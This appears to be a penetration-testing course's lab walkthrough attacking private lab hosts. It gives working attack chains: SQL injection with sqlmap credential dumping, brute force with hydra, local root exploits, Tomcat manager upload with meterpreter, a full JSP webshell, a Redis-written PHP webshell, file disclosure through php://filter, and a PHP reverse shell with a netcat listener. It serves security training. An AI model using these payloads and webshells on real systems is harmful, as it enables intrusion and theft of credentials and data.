+curl -X POST -F 'file=/var/www/phpmy/config.inc.php' http://172.31.2.47/test.php
+-----------------------------------------------------------------------
+<?php
+ 
+/* Servers configuration */
+$i = 0;
+ 
+/* Server: localhost [1] */
+$i++;
+$cfg['Servers'][$i]['verbose'] = 'localhost';
+$cfg['Servers'][$i]['host'] = 'localhost';
+$cfg['Servers'][$i]['port'] = '';
+$cfg['Servers'][$i]['socket'] = '';
+$cfg['Servers'][$i]['connect_type'] = 'tcp';
+$cfg['Servers'][$i]['extension'] = 'mysqli';
+$cfg['Servers'][$i]['auth_type'] = 'cookie';
+$cfg['Servers'][$i]['user'] = 'root';
+$cfg['Servers'][$i]['password'] = 'roottoor';
+$cfg['Servers'][$i]['AllowNoPassword'] = true;
+ 
+ 
+---------------------------Type This-----------------------------------
+ssh -l root 172.31.2.47
+    roottoor
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+ 
+Attack steps:
+-------------
+ 
+ 
+ 
+Step 1: Ping sweep the target network
+-------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Found 3 hosts
+172.31.2.64
+172.31.2.217
+172.31.2.238
+ 
+ 
+ 
+Step 2: Port scan target system
+-------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sV 172.31.2.64
+-----------------------------------------------------------------------
+ 
+ 
+ 
+-------------Scan Results--------------------------------------------
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
+514/tcp  filtered shell
+1037/tcp filtered ams
+6667/tcp open     irc     ngircd
+Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+--------------------------------------------------------------------
+ 
+ 
+Step 3: Vulnerability Scan the webserver
+----------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.64
+-----------------------------------------------------------------------
+ 
+ 
+Step 4: Run dirbuster or similar directory bruteforce tool against the target
+-----------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+ 
+perl Webr00t.pl -h 172.31.2.64 -v
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 5: Browse the web site to look for clues
+---------------------------------------------
+Since no glaring vulnerabilities were found with the scanner - we start just looking around the website itself
+ 
+ 
+..... really didn't get much from here so we just opened the web page in a browser
+http://172.31.2.64/
+ 
+.....browsed to the webpage and saw that it pointed to:
+http://172.31.2.64/jabc
+ 
+....clicked on documentation link and found hidden text that pointed to here:
+http://172.31.2.64/jabcd0cs/
+ 
+....saw that the app was OpenDocMan v1.2.7 and found it was vulnerable:
+https://www.exploit-db.com/exploits/32075/
+ 
+Tried the sql injection described in exploit-db:
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,version(),3,4,5,6,7,8,9
+ 
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,user(),3,4,5,6,7,8,9
+ 
+ 
+ 
+Tried to run sqlmap against the target
+ 
+ 
+---------------------------Type This-----------------------------------
+cd sqlmap-dev/
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -b --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-user --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-db --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --users --passwords --dbms=mysql
+-----------------------------------------------------------------------
+ 
+ 
+ 
+FOUND: cracked password 'toor' for user 'drupal7' (sqlmap)
+FOUND: 9CFBBC772F3F6C106020035386DA5BBBF1249A11 hash is 'toor' verified at crackstation.net
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs --tables --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs -T odm_user --dump --dbms=mysql
+-----------------------------------------------------------------------
+ 
+    username:   webmin
+    hash:       b78aae356709f8c31118ea613980954b
+ 
+https://hashkiller.co.uk/md5-decrypter.aspx
+   
+    hash:       b78aae356709f8c31118ea613980954b
+    pass:       webmin1980
+ 
+ 
+ok - /phpmyadmin and /webmin both did not work in the browser but these credentials worked for SSH.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+    webmin1980
+ 
+id
+ 
+cat /etc/*release
+-----------------------------------------------------------------------
+ 
+ 
+ 
+....tired of not having a real command shell...
+ 
+ 
+---------------------------Type This-----------------------------------
+python -c 'import pty;pty.spawn("/bin/bash")'
+ 
+ 
+cd /tmp
+ 
+pwd
+ 
+ 
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/39166/
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+gcc -o boom exploit.c
+ 
+./boom
+-----------------------------------------------------------------------
+ 
+ 
+------------exploit failed, damn let's try another one ---------
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+cat >> exploit2.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/37292/
+ 
+ 
+out
+ 
+ 
+gcc -o boom2 exploit2.c
+ 
+./boom2
+ 
+id
+ 
+ 
+......YEAH - do the happy dance!!!!
+ 
+ 
+ 
+ 
+---- Previous class attack process -------
+ 
+ 
+#########################
+# Building a quick list #
+#########################
+ 
+---------------------------Type This-----------------------------------
+ 
+cd ~
+echo bob >> list.txt
+echo jim >> list.txt
+echo joe >> list.txt
+echo tim >> list.txt
+echo admin >> list.txt
+echo hello >> list.txt
+echo rob >> list.txt
+echo test >> list.txt
+echo aaaaaa >> list.txt
+echo larry >> list.txt
+echo mario >> list.txt
+echo jason >> list.txt
+echo john >> list.txt
+-----------------------------------------------------------------------
+ 
+ 
+###########################################################
+# Let's start with some basic scanning of the lab network #
+###########################################################
+ 
+---------------------------Type This-----------------------------------
+ 
+infosecaddicts@ubuntu:~$ nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+ 
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-11-21 13:17 EST
+Nmap scan report for 172.31.2.24
+Host is up (0.046s latency).
+Nmap scan report for 172.31.2.47
+Host is up (0.045s latency).
+Nmap scan report for 172.31.2.64
+Host is up (0.037s latency).
+Nmap scan report for 172.31.2.86
+Host is up (0.040s latency).
+Nmap scan report for 172.31.2.117
+Host is up (0.038s latency).
+Nmap scan report for 172.31.2.139
+Host is up (0.037s latency).
+Nmap scan report for 172.31.2.157
+Host is up (0.036s latency).
+Nmap scan report for 172.31.2.217
+Host is up (0.047s latency).
+Nmap scan report for 172.31.2.238
+Host is up (0.036s latency).
+Nmap done: 256 IP addresses (9 hosts up) scanned in 3.22 seconds
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+infosecaddicts@ubuntu:~$ sudo nmap -sS 172.31.2.24
+-----------------------------------------------------------------------
+ 
+[sudo] password for infosecaddicts:
+ 
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-11-21 13:18 EST
+Nmap scan report for 172.31.2.24
+Host is up (1.8s latency).
+Not shown: 989 closed ports
+PORT     STATE    SERVICE
+25/tcp   open     smtp
+80/tcp   open     http
+111/tcp  open     rpcbind
+139/tcp  open     netbios-ssn
+445/tcp  open     microsoft-ds
+514/tcp  filtered shell
+1322/tcp open     novation
+2049/tcp open     nfs
+8080/tcp open     http-proxy
+8081/tcp open     blackice-icecap
+9000/tcp open     cslistener
+ 
+Nmap done: 1 IP address (1 host up) scanned in 133.56 seconds
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+infosecaddicts@ubuntu:~$ sudo nmap -sV -p25,80,111,139,445,1322,2049,8080,8081,9000 172.31.2.24
+-----------------------------------------------------------------------
+ 
+Starting Nmap 7.12 ( https://nmap.org ) at 2017-11-21 13:21 EST
+Nmap scan report for 172.31.2.24
+Host is up (0.031s latency).
+PORT     STATE SERVICE     VERSION
+25/tcp   open  ftp         vsftpd 3.0.2
+80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: CANYOUPWNME)
+445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: CANYOUPWNME)
+1322/tcp open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+8081/tcp open  http        Apache httpd 2.4.7 ((Ubuntu))
+9000/tcp open  http        Jetty winstone-2.9
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###########################
+# Day 1: Attacking Kevgir #
+###########################
+ 
+ 
+******** Attacking Kevgir ********
+I figured I've give you something fun to play with.
+ 
+ 
+ 
+###############
+# Using Nikto #
+###############
+ 
+---------------------------Type This-----------------------------------
+ 
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.24
+ 
+perl nikto.pl -h 172.31.2.24:8080
+ 
+perl nikto.pl -h 172.31.2.24:8081
+ 
+perl nikto.pl -h 172.31.2.24:9000
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+####################
+# Using Metasploit #
+####################
+ 
+---------------------------Type This-----------------------------------
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use auxiliary/scanner/http/http_version        
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+-------------------------------
+ 
+use auxiliary/scanner/http/tomcat_enum          
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+####################
+# Attacking Tomcat #
+####################
+ 
+---------------------------Type This-----------------------------------
+ 
+use auxiliary/scanner/http/http_version        
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+-------------------------------
+ 
+ 
+use auxiliary/scanner/http/tomcat_mgr_login          
+ 
+set USERNAME tomcat
+ 
+set USERPASS_FILE /home/infosecaddicts/list.txt
+ 
+set STOP_ON_SUCCESS true
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+ 
+ 
+-------------------------------
+ 
+use exploit/multi/http/tomcat_mgr_upload
+ 
+set HttpUsername tomcat
+ 
+set HttpPassword tomcat
+ 
+set RHOST 172.31.2.24
+ 
+set RPORT 8080
+ 
+set PATH /manager/html
+ 
+set PAYLOAD java/meterpreter/bind_tcp
+ 
+exploit
+ 
+ 
+run post/linux/gather/checkvm
+ 
+run post/linux/gather/enum_configs
+ 
+run post/linux/gather/enum_protections
+ 
+run post/linux/gather/enum_system
+ 
+run post/linux/gather/enum_users_history
+ 
+run post/linux/gather/hashdump
+ 
+shell
+ 
+/bin/bash
+ 
+id
+ 
+uname -a
+ 
+dpkg -l
+ 
+cd /tmp
+ 
+pwd
+ 
+ 
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/39166.c
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+ 
+gcc -o boom exploit.c
+ 
+./boom
+ 
+id
+ 
+ 
+-----------------------------------------------------------------------
+ 
+---------------------------Type This-----------------------------------
+ 
+hydra -l tomcat -P /home/infosecaddicts/list.txt -e ns -s 8080 -vV 172.31.2.24 http-get /manager/html
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+-------------------------------------------index.jsp-------------------------------------------
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+"</br>"; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%>
+<pre><%=output %></pre>
+-------------------------------------------index.jsp-------------------------------------------
+ 
+***** now pack the webshell *****
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+mkdir webshell
+cp index.jsp webshell
+ 
+cd webshell
+jar -cvf ../webshell.war *
+-----------------------------------------------------------------------
+ 
+ 
+Deploy the WAR file using the built-in deploy option on the manager web-page.
+Once the WAR file is deployed I simply browse to the URL I deployed the WAR file
+now upload the webshell.war. After uploading, visit page: http://172.31.2.2:8080/webshell/
+ 
+ 
+ 
+****** This section isn't finished ******
+ 
+ ---------------------------Type This-----------------------------------
+ 
+cd ~/toolz/metasploit
+ 
+./msfvenom -p linux/x86/shell_bind_tcp LPORT="7777" -f war > /home/infosecaddicts/bind7777.war
+ 
+jar tf ~/bind7777.war
+-----------------------------------------------------------------------
+ 
+****** This section isn't finished ******
+ 
+Google is your friend hahahahahahahah........
+ 
+ 
+#################
+# Attacking FTP #
+#################
+ 
+---------------------------Type This-----------------------------------
+ 
+sudo nmap -sV -Pn -p25 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 172.31.2.24
+ 
+cd ~/toolz/hydra
+ 
+hydra -l admin -P /home/infosecaddicts/list.txt -u -s 25 172.31.2.24 ftp
+ 
+ftp
+open 172.31.2.24
+admin
+admin
+pwd
+ls -lah
+ 
+ls ../../
+-----------------------------------------------------------------------
+ 
+ 
+#################
+# Attacking SSH #
+#################
+ 
+---------------------------Type This-----------------------------------
+ 
+sudo apt-get install -y libssh-dev
+     infosecaddicts
+cd ~/toolz/hydra
+make clean
+./configure
+make
+sudo make install
+ 
+ 
+hydra -L /home/infosecaddicts/list.txt -P /home/infosecaddicts/list.txt -u -s 1322 172.31.2.24 ssh
+ 
+ssh -p 1322 admin@172.31.2.24
+ 
+ 
+-------------------------------
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use auxiliary/scanner/ssh/ssh_enumusers          
+ 
+set USER_FILE /home/infosecaddicts/list.txt
+ 
+set STOP_ON_SUCCESS true
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 1322
+ 
+run
+ 
+ 
+ 
+ 
+ 
+use auxiliary/scanner/ssh/ssh_login          
+ 
+set USER_FILE /home/infosecaddicts/list.txt
+ 
+set PASS_FILE /home/infosecaddicts/list.txt
+ 
+set STOP_ON_SUCCESS true
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 1322
+ 
+run
+ 
+ 
+sessions -l
+ 
+sessions -u 1
+ 
+sessions -i 1
+ 
+id
+ 
+-----------------------------------------------------------------------
+ 
+ 
+########################
+# Attacking phpMyAdmin #
+########################
+****** This section isn't finished ******
+ 
+---------------------------Type This-----------------------------------
+ 
+hydra -l root -P /home/infosecaddicts/list.txt -e n http-post-form://172.31.2.24 -m "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:S=information_schema"
+-----------------------------------------------------------------------
+ 
+****** This section isn't finished ******
+ 
+Google is your friend hahahahahahahah........
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+wget https://repo.palkeo.com/repositories/mysterie.fr/prog/darkc0de/others/pmabf.py
+ 
+python pmabf.py http://172.31.2.24 root list.txt        (this gave me the WRONG password)
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+####################
+# Attacking Joomla #
+####################
+ 
+---------------------------Type This-----------------------------------
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use use auxiliary/scanner/http/joomla_plugins            
+ 
+set RHOSTS 172.31.2.24
+ 
+set RPORT 8080
+ 
+run
+-----------------------------------------------------------------------
+ 
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+#####################
+# Attacking Jenkins #
+#####################
+ 
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+#################
+# Attacking NFS #
+#################
+ 
+---------------------------Type This-----------------------------------
+ 
+sudo apt install -y rpcbind nfs-common
+ 
+rpcinfo -s 172.31.2.24
+ 
+showmount -e 172.31.2.24
+ 
+sudo /bin/bash
+ 
+mkdir /tmp/nfs
+ 
+mount -t nfs 172.31.2.24:/backup /tmp/nfs -o nolock
+ 
+ls /tmp/nfs
+ 
+cp /tmp/nfs/backup.tar.bz2.zip /home/infosecaddicts
+ 
+umount -l /tmp/nfs
+ 
+exit
+ 
+sudo apt-cache search fcrackzip
+ 
+sudo apt-get install -y fcrackzip
+ 
+fcrackzip -u backup.tar.bz2.zip
+ 
+unzip -P aaaaaa backup.tar.bz2.zip
+ 
+tar jxf backup.tar.bz2
+-----------------------------------------------------------------------
+ 
+ 
+###################
+# Attacking Redis #
+###################
+ 
+---------------------------Type This-----------------------------------
+ 
+sudo nmap -p 6379 --script=redis-info 172.31.2.24
+    infosecaddicts
+ 
+sudo apt-get install -y redis-tools
+    infosecaddicts
+ 
+redis-cli -h 172.31.2.24
+ 
+CONFIG SET dir /var/www/html/main
+ 
+CONFIG GET dir
+ 
+config set dbfilename boom.php
+ 
+CONFIG GET dbfilename
+ 
+SET cmd "<?php system($_GET['joe']); ?>"
+ 
+BGSAVE
+ 
+http://172.31.2.24/boom.php
+ 
+http://172.31.2.24/boom.php?joe=id
+ 
+ 
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt/.ssh"
+ 
+ 
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use auxiliary/scanner/redis/file_upload
+ 
+set RHOSTS 172.31.2.24
+ 
+set LocalFile
+ 
+****** This section isn't finished ******
+Google is your friend hahahahahahahah........
+ 
+ 
+ 
+ 
+ 
+sudo nmap -sV -p 3260 172.31.2.217
+ 
+ 
+sudo apt install open-iscsi
+ 
+sudo iscsiadm -m discovery -t  st -p 172.31.2.217
+ 
+sudo iscsiadm -m discovery -t  st -p 172.31.2.217:3260
+ 
+sudo iscsiadm -m node -p 172.31.2.217 --login
+ 
+sudo /bin/bash
+ 
+fdisk -l
+    ***** look for /dev/sda5 - Linux swap / Solaris *******
+ 
+mkdir /mnt/217vm
+ 
+mount /dev/sdb /mnt/217vm
+ 
+cd /mnt/217vm
+ 
+ls
+ 
+cat flag1.txt
+ 
+file bobsdisk.dsk
+ 
+mkdir /media/bobsdisk
+ 
+mount /mnt/217vm/bobsdisk.dsk /media/bobsdisk
+ 
+/mnt/217vm# ls
+ 
+cd /media/bobsdisk/
+ 
+ls
+ 
+cat ToAlice.eml
+ 
+file bobsdisk.dsk
+ 
+mkdir /media/bobsdisk
+ 
+mount /mnt/217vm/bobsdisk.dsk /media/bobsdisk
+ 
+/mnt/217vm# ls
+ 
+cd /media/bobsdisk/
+ 
+ls
+ 
+cat ToAlice.eml
+ 
+file ToAlice.csv.enc
+ 
+file bobsdisk.dsk
+ 
+pwd
+ 
+mkdir /media/bobsdisk
+ 
+ 
+mount /mnt/217vm/bobsdisk.dsk /media/bobsdisk
+ 
+ls
+ 
+cd /media/bobsdisk/
+ 
+ls
+ 
+openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
+ 
+ls
+ 
+cat ToAlice.eml | grep flag
+ 
+openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
+ 
+ls
+ 
+cat ToAlice.eml
+    ***** look for supercalifragilisticoespialidoso ******
+ 
+openssl enc -aes-256-cbc -d -md sha256 -in ToAlice.csv.enc -out ToAlice.csv
+ 
+    supercalifragilisticoespialidoso
+ 
+ 
+ls
+ 
+cat ToAlice.csv
+-----------------------------------------------------------------------
+ 
+-----------------------------------------------------
+Web Path,Reason
+5560a1468022758dba5e92ac8f2353c0,Black hoodie. Definitely a hacker site!
+c2444910794e037ebd8aaf257178c90b,Nice clean well prepped site. Nothing of interest here.
+flag3{2cce194f49c6e423967b7f72316f48c5caf46e84},The strangest URL I've seen? What is it?
+ 
+-----------------------------------------------------
+ 
+The hints are "Web Path" and "strangest URL" so let's try the long strings in the URL:
+http://172.31.2.217/5560a1468022758dba5e92ac8f2353c0/
+  -- view source
+ 
+Found this string in the source:
+R2VvcmdlIENvc3RhbnphOiBbU291cCBOYXppIGdpdmVzIGhpbSBhIGxvb2tdIE1lZGl1bSB0dXJr
+ZXkgY2hpbGkuIApbaW5zdGFudGx5IG1vdmVzIHRvIHRoZSBjYXNoaWVyXSAKSmVycnkgU2VpbmZl
+bGQ6IE1lZGl1bSBjcmFiIGJpc3F1ZS4gCkdlb3JnZSBDb3N0YW56YTogW2xvb2tzIGluIGhpcyBi
+YWcgYW5kIG5vdGljZXMgbm8gYnJlYWQgaW4gaXRdIEkgZGlkbid0IGdldCBhbnkgYnJlYWQuIApK
+ZXJyeSBTZWluZmVsZDogSnVzdCBmb3JnZXQgaXQuIExldCBpdCBnby4gCkdlb3JnZSBDb3N0YW56
+YTogVW0sIGV4Y3VzZSBtZSwgSSAtIEkgdGhpbmsgeW91IGZvcmdvdCBteSBicmVhZC4gClNvdXAg
+TmF6aTogQnJlYWQsICQyIGV4dHJhLiAKR2VvcmdlIENvc3RhbnphOiAkMj8gQnV0IGV2ZXJ5b25l
+IGluIGZyb250IG9mIG1lIGdvdCBmcmVlIGJyZWFkLiAKU291cCBOYXppOiBZb3Ugd2FudCBicmVh
+ZD8gCkdlb3JnZSBDb3N0YW56YTogWWVzLCBwbGVhc2UuIApTb3VwIE5hemk6ICQzISAKR2Vvcmdl
+IENvc3RhbnphOiBXaGF0PyAKU291cCBOYXppOiBOTyBGTEFHIEZPUiBZT1UK
+ 
+------ https://www.base64decode.org/ -------
+------ Decoded, but didn't find a flag -----
+ 
+ 
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/
+  -- view source --
+  -- Nothing in source --
+ 
+Browsed to the flag link:
+view-source:http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=flag
+  -- view source --
+  -- Nothing in source --
+ 
+ 
+Tried a PHP base64 decode with the URL:
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=welcome.php
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=party.php
+ 
+------ https://www.base64decode.org/ -------
+Use the string found here:
+http://172.31.2.217/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=flag.php
+ 
+-------------------------------------------------------------------
+PD9waHAKZGVmaW5lZCAoJ1ZJQUlOREVYJykgb3IgZGllKCdPb29vaCEgU28gY2xvc2UuLicpOwo/Pgo8aDE+RmxhZzwvaDE+CjxwPkhtbS4gTG9va2luZyBmb3IgYSBmbGFnPyBDb21lIG9uLi4uIEkgaGF2ZW4ndCBtYWRlIGl0IGVhc3kgeWV0LCBkaWQgeW91IHRoaW5rIEkgd2FzIGdvaW5nIHRvIHRoaXMgdGltZT88L3A+CjxpbWcgc3JjPSJ0cm9sbGZhY2UucG5nIiAvPgo8P3BocAovLyBPaywgb2suIEhlcmUncyB5b3VyIGZsYWchIAovLwovLyBmbGFnNHs0ZTQ0ZGIwZjFlZGMzYzM2MWRiZjU0ZWFmNGRmNDAzNTJkYjkxZjhifQovLyAKLy8gV2VsbCBkb25lLCB5b3UncmUgZG9pbmcgZ3JlYXQgc28gZmFyIQovLyBOZXh0IHN0ZXAuIFNIRUxMIQovLwovLyAKLy8gT2guIFRoYXQgZmxhZyBhYm92ZT8gWW91J3JlIGdvbm5hIG5lZWQgaXQuLi4gCj8+Cg==
+-------------------------------------------------------------------
+<?php
+defined ('VIAINDEX') or die('Ooooh! So close..');
+?>
+<h1>Flag</h1>
+<p>Hmm. Looking for a flag? Come on... I haven't made it easy yet, did you think I was going to this time?</p>
+<img src="trollface.png" />
+<?php
+// Ok, ok. Here's your flag!
+//
+// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+//
+// Well done, you're doing great so far!
+// Next step. SHELL!
+//
+//
+// Oh. That flag above? You're gonna need it...
+?>
+ 
+######################
+# Attacking Minotaur #
+######################
+ 
+Step 1: Portscan/Bannergrab the target host
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.117
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 2: Vulnerability scan the web server
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd ~/toolz/Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.117
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 3: Directory brute-force the webserver
+---------------------------Type This-----------------------------------
+cd ~/toolz
+
+sudo apt install -y libcurl4-openssl-dev
+ 
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+dirb
+ 
+./dirb http://172.31.2.117 wordlists/big.txt
+-----------------------------------------------------------------------
+ 
+### dirb output ###
+==> DIRECTORY: http://172.31.2.117/bull/
+-----------------------------------------------------------------------
+ 
+ 
+Step 4: Run wordpress vulnerability scanner
+---------------------------Type This-----------------------------------
+sudo apt-get install -y libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev ruby-dev build-essential libgmp-dev zlib1g-dev
+ 
+cd ~/toolz
+ 
+rm -rf wpsca*
+ 
+git clone https://github.com/wpscanteam/wpscan.git
+ 
+cd wpscan
+ 
+sudo gem install bundler && bundle install --without test development
+ 
+rbenv install 2.5.0-dev
+ 
+ruby wpscan.rb -u http://172.31.2.117/bull/ --enumerate u
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+Step 5: Attack vulnerable Wordpress plugin with Metasploit
+---------------------------Type This-----------------------------------
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+use exploit/unix/webapp/wp_slideshowgallery_upload
+ 
+set RHOST 172.31.2.117
+ 
+set RPORT 80
+ 
+set TARGETURI /bull
+ 
+set WP_USER bully
+ 
+set WP_PASSWORD Bighornedbulls
+ 
+exploit
+-----------------------------------------------------------------------
+ 
+Damn...that didn't work...Can't reverse shell from inside the network to a host in the VPN network range.
+This is a lab limitation that I implemented to stop students from compromising hosts in the lab network
+and then from the lab network attacking other students.
+ 
+ 
+---------------------------Type This-----------------------------------
+wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
+ 
+tar -zxvf php-reverse-shell-1.0.tar.gz
+ 
+cd ~/toolz/php-reverse-shell-1.0/
+ 
+nano php-reverse-shell.php
+-----------------------------------------------------------------------
+    ***** change the $ip and $port variables to a host that you have already compromised in the network
+    ***** for this example I chose 172.31.2.64 and kept port 1234
+ 
+ 
+---------------------------Type This-----------------------------------
+chmod 777 php-reverse-shell.php
+cp php-reverse-shell.php ..
+-----------------------------------------------------------------------
+ 
+ 
+ 
+----------- Paste this into a new file called wp_gallery_slideshow_146_suv.py -----------
+https://www.exploit-db.com/raw/34681/
+ 
+python wp_gallery_slideshow_146_suv.py -t http://172.31.2.117/bull/ -u bully -p Bighornedbulls -f php-reverse-shell.php
+ 
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Set up netcat listener on previously compromised host
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+    webmin1980
+ 
+python -c 'import pty;pty.spawn("/bin/bash")'
+ 
+ 
+cd /tmp
+ 
+./boom2
+ 
+nc -lvp 1234
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+---------------------Type This in your browser ------------------------
+http://172.31.2.117/bull//wp-content/uploads/slideshow-gallery/php-reverse-shell.php
+-----------------------------------------------------------------------
+ 
+ 
+Now check your listener to see if you got the connection
+---------------------------Type This-----------------------------------
+id
+ 
+/sbin/ifconfig
+ 
+python -c 'import pty;pty.spawn("/bin/bash")'
+ 
+---------------------------Type This-----------------------------------
+cd /tmp
+cat >> exploit2.c << out
+-----------------------------------------------------------------------
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/37292/
+ 
+**************hit enter a few times *****************
+ 
+---------------------------Type This-----------------------------------
+out
+ 
+ 
